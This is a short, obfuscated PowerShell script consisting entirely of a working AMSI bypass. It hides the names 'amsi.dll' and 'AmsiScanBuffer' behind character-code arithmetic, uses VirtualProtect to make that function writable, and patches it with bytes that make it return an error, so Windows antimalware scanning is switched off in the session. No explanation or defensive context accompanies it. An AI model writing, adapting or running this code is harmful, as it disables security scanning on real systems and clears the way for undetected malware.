$C6wi1 = @"
using System;
using System.Runtime.InteropServices;
public class C6wi1 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr yW1t5V680ax55pnRVZSn, string gxC6AzNcDWY);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr X8VN, UIntPtr N9Njo4LYkf1L36bJI5, uint CU1ND, out uint VptO);
}
"@

Add-Type $C6wi1

$oOKEEWn88_Zu = [C6wi1]::LoadLibrary("$([chaR](97)+[Char]([BYTe]0x6d)+[cHar](115+46-46)+[CHAr](105)+[CHaR](46)+[cHar](100+78-78)+[cHaR](108)+[chAR]([BYte]0x6c))")
$MuO = [C6wi1]::GetProcAddress($oOKEEWn88_Zu, "$([cHAr]([bYtE]0x41)+[cHaR](53+56)+[ChAr]([bytE]0x73)+[chaR]([bytE]0x69)+[cHAR](74+9)+[ChAr]([bYTE]0x63)+[chAr]([byte]0x61)+[ChAR](110*57/57)+[ChAR](66)+[Char]([BYtE]0x75)+[CHar](102)+[CHAR](102*29/29)+[char]([BYtE]0x65)+[CHaR]([Byte]0x72))")
$p = 0
[C6wi1]::VirtualProtect($MuO, [uint32]5, 0x40, [ref]$p)
$n8Oy3u7f81SqjpwiZuw = "0xB8"
$zstu26h4M = "0x57"
$a0pc1BJas4j = "0x00"
$lscDdGWSG913MGg = "0x07"
$hqMmOT39kbVi8rzbaPaz = "0x80"
$VHv0e7qCYckS = "0xC3"
$xC_FjABoV = [Byte[]] ($n8Oy3u7f81SqjpwiZuw,$zstu26h4M,$a0pc1BJas4j,$lscDdGWSG913MGg,+$hqMmOT39kbVi8rzbaPaz,+$VHv0e7qCYckS)
[System.Runtime.InteropServices.Marshal]::Copy($xC_FjABoV, 0, $MuO, 6)